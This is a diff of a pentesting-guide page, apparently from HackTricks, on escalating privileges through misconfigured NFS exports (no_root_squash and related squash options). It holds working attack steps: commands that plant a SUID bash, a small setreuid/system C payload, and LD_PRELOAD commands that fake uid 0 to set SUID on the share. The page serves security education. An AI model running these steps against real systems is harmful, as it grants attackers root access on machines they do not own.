@@ -1,18 +1,30 @@
 {{#include ../../banners/hacktricks-training.md}}
 
-Read the _ **/etc/exports** _ file, if you find some directory that is configured as **no_root_squash**, then you can **access** it from **as a client** and **write inside** that directory **as** if you were the local **root** of the machine.
 
-**no_root_squash**: This option basically gives authority to the root user on the client to access files on the NFS server as root. And this can lead to serious security implications.
+# Squashing Basic Info
 
-**no_all_squash:** This is similar to **no_root_squash** option but applies to **non-root users**. Imagine, you have a shell as nobody user; checked /etc/exports file; no_all_squash option is present; check /etc/passwd file; emulate a non-root user; create a suid file as that user (by mounting using nfs). Execute the suid as nobody user and become different user.
+NFS will usually (specially in linux) trust the indicated `uid` and `gid` by the client conencting to access the files (if kerberos is not used). However, there are some configurations that can be set in the server to **change this behavior**:
+
+- **`all_squash`**: It squashes all accesses mapping every user and group to **`nobody`** (65534 unsigned / -2 signed). Therefore, everyone is `nobody` and no users are used.
+- **`root_squash`/`no_all_squash`**: This is default on Linux and **only squashes access with uid 0 (root)**. Therefore, any `UID` and `GID` are trusted but `0` is squashed to `nobody` (so no root imperonation is possible).
+- **``no_root_squash`**: This configuration if enabled doesn't even squash the root user. This means that if you mount a directory with this configuration you can access it as root.
+
+In the **/etc/exports** file, if you find some directory that is configured as **no_root_squash**, then you can **access** it from **as a client** and **write inside** that directory **as** if you were the local **root** of the machine.
+
+For more information about **NFS** check:
+
+{{#ref}}
+/network-services-pentesting/nfs-service-pentesting.md
+{{#endref}}
 
 # Privilege Escalation
 
 ## Remote Exploit
 
-If you have found this vulnerability, you can exploit it:
-
+Option 1 using bash:
 - **Mounting that directory** in a client machine, and **as root copying** inside the mounted folder the **/bin/bash** binary and giving it **SUID** rights, and **executing from the victim** machine that bash binary.
+    - Note that to be root inside the NFS share, **`no_root_squash`** must be configured in the server.
+    - However, if not enabled, you could escalate to other user by copying the binary to the NFS share and giving it the SUID permission as the user you want to escalate to.
 
 ```bash
 #Attacker, as root user
@@ -27,7 +39,9 @@ cd <SHAREDD_FOLDER>
 ./bash -p #ROOT shell
 ```
 
+Option 2 using c compiled code:
 - **Mounting that directory** in a client machine, and **as root copying** inside the mounted folder our come compiled payload that will abuse the SUID permission, give to it **SUID** rights, and **execute from the victim** machine that binary (you can find here some[ C SUID payloads](payloads-to-execute.md#c)).
+    - Same restrictions as before
 
 ```bash
 #Attacker, as root user
@@ -72,26 +86,27 @@ The exploit involves creating a simple C program (`pwn.c`) that elevates privile
 
 1. **Compile the exploit code:**
 
-   ```bash
-   cat pwn.c
-   int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
-   gcc pwn.c -o a.out
-   ```
+```bash
+cat pwn.c
+int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
+gcc pwn.c -o a.out
+```
 
 2. **Place the exploit on the share and modify its permissions by faking the uid:**
 
-   ```bash
-   LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
-   LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
-   LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
-   LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
-   ```
+```bash
+LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
+LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
+LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
+LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
+```
 
 3. **Execute the exploit to gain root privileges:**
-   ```bash
-   /mnt/share/a.out
-   #root
-   ```
+
+```bash
+/mnt/share/a.out
+#root
+```
 
 ## Bonus: NFShell for Stealthy File Access
 
